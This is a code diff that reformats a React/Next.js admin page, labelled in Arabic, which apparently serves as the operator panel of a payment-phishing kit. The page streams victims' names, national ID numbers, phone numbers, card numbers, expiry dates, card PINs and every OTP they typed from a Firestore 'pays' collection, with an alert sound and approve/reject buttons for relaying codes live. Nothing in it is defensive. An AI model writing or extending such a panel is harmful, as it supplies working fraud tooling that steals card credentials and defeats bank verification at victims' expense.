@@ -1,171 +1,149 @@
-'use client';
+"use client"
 
-import { useState, useEffect } from 'react';
-import { useRouter } from 'next/navigation';
-import { Trash2 } from 'lucide-react';
-import { Button } from '@/components/ui/button';
-import { Badge } from '@/components/ui/badge';
-import {
-  Dialog,
-  DialogContent,
-  DialogDescription,
-  DialogHeader,
-  DialogTitle,
-} from '@/components/ui/dialog';
-import { db, auth } from '@/lib/firestore';
-import {
-  collection,
-  getDocs,
-  doc,
-  deleteDoc,
-  writeBatch,
-  updateDoc,
-  onSnapshot,
-  query,
-  orderBy,
-} from 'firebase/firestore';
-import { onAuthStateChanged, signOut } from 'firebase/auth';
-import { playNotificationSound } from '@/lib/actions';
+import { useState, useEffect } from "react"
+import { useRouter } from "next/navigation"
+import { Trash2 } from "lucide-react"
+import { Button } from "@/components/ui/button"
+import { Badge } from "@/components/ui/badge"
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
+import { ar } from "date-fns/locale"
+
+import { formatDistanceToNow } from "date-fns"
+import { db, auth } from "@/lib/firestore"
+import { collection, doc, deleteDoc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
+import { onAuthStateChanged, signOut } from "firebase/auth"
+import { playNotificationSound } from "@/lib/actions"
+
 interface Notification {
-  id: string;
-  name: string;
-  hasPersonalInfo: boolean;
-  hasCardInfo: boolean;
-  currentPage: string;
-  createdDate: string;
-  notificationCount: number;
+  id: string
+  name: string
+  hasPersonalInfo: boolean
+  hasCardInfo: boolean
+  currentPage: string
+  createdDate: string
+  notificationCount: number
   personalInfo?: {
-    id: string;
-    fullName: string;
-    phone: string;
-  };
-  bank: string;
-  cardNumber: string;
-  prefix: string;
-  year: string;
-  month: string;
-  cvv: string;
-  otp: string;
-  pass: string;
-  allOtps: string[];
-  status?: 'pending' | 'approved' | 'rejected';
+    id: string
+    fullName: string
+    phone: string
+  }
+  bank: string
+  cardNumber: string
+  prefix: string
+  year: string
+  month: string
+  cvv: string
+  otp: string
+  pass: string
+  allOtps: string[]
+  status?: "pending" | "approved" | "rejected"
 }
 
 export default function NotificationsPage() {
-  const [notifications, setNotifications] = useState<Notification[]>([]);
-  const [isLoading, setIsLoading] = useState(true);
-  const [pageName, setPagename] = useState<string>('');
-  const [message, setMessage] = useState<boolean>(false);
-  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(
-    null
-  );
-  const [selectedNotification, setSelectedNotification] =
-    useState<Notification | null>(null);
-  const router = useRouter();
+  const [notifications, setNotifications] = useState<Notification[]>([])
+  const [isLoading, setIsLoading] = useState(true)
+  const [pageName, setPagename] = useState<string>("")
+  const [message, setMessage] = useState<boolean>(false)
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
+  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
+  const router = useRouter()
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
-        router.push('/login');
+        router.push("/login")
       } else {
-        const unsubscribeNotifications = fetchNotifications();
+        const unsubscribeNotifications = fetchNotifications()
         return () => {
-          unsubscribeNotifications();
-        };
+          unsubscribeNotifications()
+        }
       }
-    });
+    })
 
-    return () => unsubscribe();
-  }, [router]);
+    return () => unsubscribe()
+  }, [router])
 
   const fetchNotifications = () => {
-    setIsLoading(true);
-    const q = query(collection(db, 'pays'), orderBy('createdDate', 'desc'));
+    setIsLoading(true)
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs.map((doc) => ({
           id: doc.id,
           ...doc.data(),
-        })) as Notification[];
-        setNotifications(notificationsData);
-        setIsLoading(false);
-        playNotificationSound();
+        })) as Notification[]
+        setNotifications(notificationsData)
+        setIsLoading(false)
+        playNotificationSound()
       },
       (error) => {
-        console.error('Error fetching notifications:', error);
-        setIsLoading(false);
-      }
-    );
+        console.error("Error fetching notifications:", error)
+        setIsLoading(false)
+      },
+    )
 
-    return unsubscribe;
-  };
+    return unsubscribe
+  }
+
   const handleClearAll = async () => {
-    setIsLoading(true);
+    setIsLoading(true)
     try {
-      const batch = writeBatch(db);
+      const batch = writeBatch(db)
       notifications.forEach((notification) => {
-        const docRef = doc(db, 'pays', notification.id);
-        batch.delete(docRef);
-      });
-      await batch.commit();
-      setNotifications([]);
+        const docRef = doc(db, "pays", notification.id)
+        batch.delete(docRef)
+      })
+      await batch.commit()
+      setNotifications([])
     } catch (error) {
-      console.error('Error clearing notifications:', error);
+      console.error("Error clearing notifications:", error)
     } finally {
-      setIsLoading(false);
+      setIsLoading(false)
     }
-  };
+  }
 
   const handleDelete = async (id: string) => {
     try {
-      await deleteDoc(doc(db, 'pays', id));
-      setNotifications(
-        notifications.filter((notification) => notification.id !== id)
-      );
+      await deleteDoc(doc(db, "pays", id))
+      setNotifications(notifications.filter((notification) => notification.id !== id))
     } catch (error) {
-      console.error('Error deleting notification:', error);
+      console.error("Error deleting notification:", error)
     }
-  };
+  }
 
   const handlePageName = (id: string) => {
-    setPagename('asd');
-  };
+    setPagename("asd")
+  }
+
   const handleApproval = async (state: string, id: string) => {
-    const targetPost = doc(db, 'pays', id);
+    const targetPost = doc(db, "pays", id)
     await updateDoc(targetPost, {
       status: state,
-    });
-  };
+    })
+  }
 
   const handleLogout = async () => {
     try {
-      await signOut(auth);
-      router.push('/login');
+      await signOut(auth)
+      router.push("/login")
     } catch (error) {
-      console.error('Error signing out:', error);
+      console.error("Error signing out:", error)
     }
-  };
+  }
 
-  const handleInfoClick = (
-    notification: Notification,
-    infoType: 'personal' | 'card'
-  ) => {
-    setSelectedNotification(notification);
-    setSelectedInfo(infoType);
-  };
+  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
+    setSelectedNotification(notification)
+    setSelectedInfo(infoType)
+  }
 
   const closeDialog = () => {
-    setSelectedInfo(null);
-    setSelectedNotification(null);
-  };
+    setSelectedInfo(null)
+    setSelectedNotification(null)
+  }
 
   if (isLoading) {
-    return (
-      <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
-        جاري التحميل...
-      </div>
-    );
+    return <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">جاري التحميل...</div>
   }
 
   return (
@@ -182,11 +160,7 @@ export default function NotificationsPage() {
             >
               مسح جميع الإشعارات
             </Button>
-            <Button
-              variant="outline"
-              onClick={handleLogout}
-              className="bg-gray-700 hover:bg-gray-600"
-            >
+            <Button variant="outline" onClick={handleLogout} className="bg-gray-700 hover:bg-gray-600">
               تسجيل الخروج
             </Button>
           </div>
@@ -207,50 +181,35 @@ export default function NotificationsPage() {
             <tbody>
               {notifications.map((notification) => (
                 <tr key={notification.id} className="border-b border-gray-700">
-                  <td className="px-4 py-3">
-                    {notification!.personalInfo!.fullName}
-                  </td>
+                  <td className="px-4 py-3">{notification!.personalInfo!.fullName}</td>
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2">
                       <Badge
-                        variant={
-                          notification.hasPersonalInfo
-                            ? 'default'
-                            : 'destructive'
-                        }
+                        variant={notification.hasPersonalInfo ? "default" : "destructive"}
                         className="rounded-md cursor-pointer"
-                        onClick={() =>
-                          handleInfoClick(notification, 'personal')
-                        }
+                        onClick={() => handleInfoClick(notification, "personal")}
                       >
-                        {notification.hasPersonalInfo
-                          ? 'معلومات شخصية'
-                          : 'لا يوجد معلومات'}
+                        {notification.hasPersonalInfo ? "معلومات شخصية" : "لا يوجد معلومات"}
                       </Badge>
                       <Badge
-                        variant={
-                          notification.cardNumber ? 'default' : 'destructive'
-                        }
-                        className={`rounded-md cursor-pointer ${
-                          notification.cardNumber ? 'bg-green-500' : ''
-                        }`}
-                        onClick={() => handleInfoClick(notification, 'card')}
+                        variant={notification.cardNumber ? "default" : "secondary"}
+                        className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500" : ""}`}
+                        onClick={() => handleInfoClick(notification, "card")}
                       >
-                        {notification.cardNumber
-                          ? 'معلومات البطاقة'
-                          : 'لا يوجد بطاقة'}
+                        {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                       </Badge>
                     </div>
                   </td>
+                  <td className="px-4 py-3">خطوه - {notification.currentPage}</td>
                   <td className="px-4 py-3">
-                    خطوه - {notification.currentPage}
+                    {formatDistanceToNow(new Date(notification.createdDate), {
+                      addSuffix: true,
+                      locale: ar,
+                    })}
                   </td>
-                      <td className="px-4 py-3">{new Date(notification.createdDate!).toLocaleString("ar-SA")} (
-                      {formatDistanceToNow(new Date(notification.createdDate!), { addSuffix: true, locale: ar })})</td>
                   <td className="px-4 py-3 text-center">
                     <Badge variant="default" className="bg-green-500">
-                      {parseInt(notification!.notificationCount!.toString()!) +
-                        1}
+                      {Number.parseInt(notification!.notificationCount!.toString()!) + 1}
                     </Badge>
                   </td>
                   <td className="px-4 py-3 text-center">
@@ -273,88 +232,73 @@ export default function NotificationsPage() {
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
         <DialogContent className="bg-gray-800 text-white" dir="rtl">
           <DialogHeader>
-            <DialogTitle dir="rtl">
-              {selectedInfo === 'personal'
-                ? 'المعلومات الشخصية'
-                : 'معلومات البطاقة'}
-            </DialogTitle>
+            <DialogTitle dir="rtl">{selectedInfo === "personal" ? "المعلومات الشخصية" : "معلومات البطاقة"}</DialogTitle>
             <DialogDescription>
-              {selectedInfo === 'personal'
-                ? 'تفاصيل المعلومات الشخصية'
-                : 'تفاصيل معلومات البطاقة'}
+              {selectedInfo === "personal" ? "تفاصيل المعلومات الشخصية" : "تفاصيل معلومات البطاقة"}
             </DialogDescription>
           </DialogHeader>
-          {selectedInfo === 'personal' &&
-            selectedNotification?.personalInfo && (
-              <div className="space-y-2">
-                <p>
-                  <strong>الاسم الكامل:</strong>{' '}
-                  {selectedNotification.personalInfo.fullName}
-                </p>
-                <p>
-                  <strong>رقم الهوية:</strong>{' '}
-                  {selectedNotification.personalInfo.id}
-                </p>
-                <p>
-                  <strong>رقم الهاتف:</strong>{' '}
-                  {selectedNotification.personalInfo.phone}
-                </p>
-              </div>
-            )}
-          {selectedInfo === 'card' && selectedNotification && (
+          {selectedInfo === "personal" && selectedNotification?.personalInfo && (
             <div className="space-y-2">
               <p>
-                <strong className="text-red-400 mx-4">البنك:</strong>{' '}
-                {selectedNotification.bank}
+                <strong>الاسم الكامل:</strong> {selectedNotification.personalInfo.fullName}
+              </p>
+              <p>
+                <strong>رقم الهوية:</strong> {selectedNotification.personalInfo.id}
+              </p>
+              <p>
+                <strong>رقم الهاتف:</strong> {selectedNotification.personalInfo.phone}
+              </p>
+            </div>
+          )}
+          {selectedInfo === "card" && selectedNotification && (
+            <div className="space-y-2">
+              <p>
+                <strong className="text-red-400 mx-4">البنك:</strong> {selectedNotification.bank}
               </p>
               <p></p>
               <p>
-                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
-                {selectedNotification.cardNumber}- {selectedNotification.prefix}
+                <strong className="text-red-400 mx-4">رقم البطاقة:</strong> {selectedNotification.cardNumber}-{" "}
+                {selectedNotification.prefix}
               </p>
               <p>
-                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
-                {selectedNotification.year}/{selectedNotification.month}
+                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong> {selectedNotification.year}/
+                {selectedNotification.month}
               </p>
 
               <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{' '}
-                {selectedNotification.pass}
+                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
               <p className="flex items-centerpt-4">
-                <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
-                {selectedNotification.otp}
+                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification.otp}
               </p>
               <></>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                 <div className="grid grid-cols-4">
                   {selectedNotification.allOtps &&
-                    selectedNotification.allOtps.map((i, index) => (
-                      <Badge key={index}>{i}</Badge>
-                    ))}
+                    selectedNotification.allOtps.map((i, index) => <Badge key={index}>{i}</Badge>)}
                 </div>
               </p>
               <div className="flex justify-between mx-1">
                 <Button
                   onClick={() => {
-                    handleApproval('approved', selectedNotification.id);
-                    setMessage(true);
+                    handleApproval("approved", selectedNotification.id)
+                    setMessage(true)
                     setTimeout(() => {
-                      setMessage(false);
-                    }, 3000);
+                      setMessage(false)
+                    }, 3000)
                   }}
-                  className="w-full m-3 bg-green-500"
+                  className="w-full m-3"
                 >
                   قبول
                 </Button>
                 <Button
                   onClick={() => {
-                    handleApproval('rejected', selectedNotification.id);
-                    setMessage(true);
+                    handleApproval("rejected", selectedNotification.id)
+                    setMessage(true)
                     setTimeout(() => {
-                      setMessage(false);
-                    }, 3000);
+                      setMessage(false)
+                    }, 3000)
                   }}
                   className="w-full m-3"
                   variant="destructive"
@@ -362,11 +306,12 @@ export default function NotificationsPage() {
                   رفض
                 </Button>
               </div>
-              <p className="text-red-500">{message ? 'تم الارسال' : ''}</p>
+              <p className="text-red-500">{message ? "تم الارسال" : ""}</p>
             </div>
           )}
         </DialogContent>
       </Dialog>
     </div>
-  );
+  )
 }
+
